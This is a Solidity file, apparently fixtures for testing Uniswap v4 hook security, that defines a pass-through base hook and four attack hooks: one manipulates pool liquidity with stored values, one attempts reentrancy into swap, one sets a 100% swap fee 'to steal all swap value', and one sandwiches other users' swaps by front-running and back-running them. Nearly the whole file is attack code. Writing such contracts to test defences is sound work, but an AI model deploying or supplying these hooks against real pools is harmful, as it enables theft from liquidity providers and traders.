// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@uniswap/v4-core/contracts/interfaces/IHooks.sol";
import "@uniswap/v4-core/contracts/interfaces/IPoolManager.sol";
import "@uniswap/v4-core/contracts/types/PoolKey.sol";
import "@uniswap/v4-core/contracts/types/BalanceDelta.sol";
import "@uniswap/v4-core/contracts/types/BeforeSwapDelta.sol";

// Base hook implementation with all required functions
abstract contract BaseHook is IHooks {
    function beforeInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96) external virtual returns (bytes4) {
        return IHooks.beforeInitialize.selector;
    }
    
    function afterInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96, int24 tick) external virtual returns (bytes4) {
        return IHooks.afterInitialize.selector;
    }
    
    function beforeAddLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata hookData) external virtual returns (bytes4) {
        return IHooks.beforeAddLiquidity.selector;
    }
    
    function afterAddLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta, BalanceDelta feesAccrued, bytes calldata hookData) external virtual returns (bytes4, BalanceDelta) {
        return (IHooks.afterAddLiquidity.selector, BalanceDelta.wrap(0));
    }
    
    function beforeRemoveLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, bytes calldata hookData) external virtual returns (bytes4) {
        return IHooks.beforeRemoveLiquidity.selector;
    }
    
    function afterRemoveLiquidity(address sender, PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta, BalanceDelta feesAccrued, bytes calldata hookData) external virtual returns (bytes4, BalanceDelta) {
        return (IHooks.afterRemoveLiquidity.selector, BalanceDelta.wrap(0));
    }
    
    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata hookData) external virtual returns (bytes4, BeforeSwapDelta, uint24) {
        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);
    }
    
    function afterSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params, BalanceDelta delta, bytes calldata hookData) external virtual returns (bytes4, int128) {
        return (IHooks.afterSwap.selector, 0);
    }
    
    function beforeDonate(address sender, PoolKey calldata key, uint256 amount0, uint256 amount1, bytes calldata hookData) external virtual returns (bytes4) {
        return IHooks.beforeDonate.selector;
    }
    
    function afterDonate(address sender, PoolKey calldata key, uint256 amount0, uint256 amount1, bytes calldata hookData) external virtual returns (bytes4) {
        return IHooks.afterDonate.selector;
    }
}

// Hook attempting state manipulation
contract StateManipulationHook is BaseHook {
    uint256 private storedValue;
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        // Store state for cross-function attack
        storedValue = uint256(params.sqrtPriceLimitX96);
        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);
    }
    
    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata hookData
    ) external override returns (bytes4, int128) {
        // Attempt to manipulate pool state using stored value
        try IPoolManager(msg.sender).modifyLiquidity(
            key,
            IPoolManager.ModifyLiquidityParams({
                tickLower: -1000,
                tickUpper: 1000,
                liquidityDelta: int256(storedValue),
                salt: bytes32(0)
            }),
            ""
        ) {} catch {}
        return (IHooks.afterSwap.selector, 0);
    }
}

// Hook attempting reentrancy attacks
contract ReentrancyHook is BaseHook {
    bool private attacking;
    
    function executeReentrancyAttack(
        address poolManager,
        PoolKey calldata key
    ) external {
        attacking = true;
        IPoolManager(poolManager).swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: true,
                amountSpecified: 1e18,
                sqrtPriceLimitX96: 0
            }),
            ""
        );
    }
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        if (attacking) {
            // Attempt reentrancy
            IPoolManager(msg.sender).swap(key, params, "");
        }
        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);
    }
}

// Hook attempting fee manipulation
contract FeeManipulationHook is BaseHook {
    uint24 private constant MAX_FEE = 1_000_000; // 100%
    bool private manipulating;
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        if (!manipulating) {
            manipulating = true;
            // Try to set maximum fee to steal all swap value
            return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), MAX_FEE | 0x400000); // Set override bit
        }
        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);
    }
}

// Hook attempting sandwich attacks
contract SandwichAttackHook is BaseHook {
    address private immutable owner;
    uint256 private constant FRONTRUN_AMOUNT = 1e18;
    bool private sandwiching;
    
    constructor() {
        owner = msg.sender;
    }
    
    function beforeSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        bytes calldata hookData
    ) external override returns (bytes4, BeforeSwapDelta, uint24) {
        if (sender != owner && !sandwiching) {
            sandwiching = true;
            // Front-run victim's swap with our own swap
            try IPoolManager(msg.sender).swap(
                key,
                IPoolManager.SwapParams({
                    zeroForOne: params.zeroForOne,
                    amountSpecified: int256(FRONTRUN_AMOUNT),
                    sqrtPriceLimitX96: params.sqrtPriceLimitX96
                }),
                ""
            ) {} catch {}
            sandwiching = false;
        }
        return (IHooks.beforeSwap.selector, BeforeSwapDelta.wrap(0), 0);
    }
    
    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        BalanceDelta delta,
        bytes calldata hookData
    ) external override returns (bytes4, int128) {
        if (sender != owner && !sandwiching) {
            sandwiching = true;
            // Back-run victim's swap by swapping back
            try IPoolManager(msg.sender).swap(
                key,
                IPoolManager.SwapParams({
                    zeroForOne: !params.zeroForOne,
                    amountSpecified: int256(FRONTRUN_AMOUNT),
                    sqrtPriceLimitX96: params.sqrtPriceLimitX96
                }),
                ""
            ) {} catch {}
            sandwiching = false;
        }
        return (IHooks.afterSwap.selector, 0);
    }
} 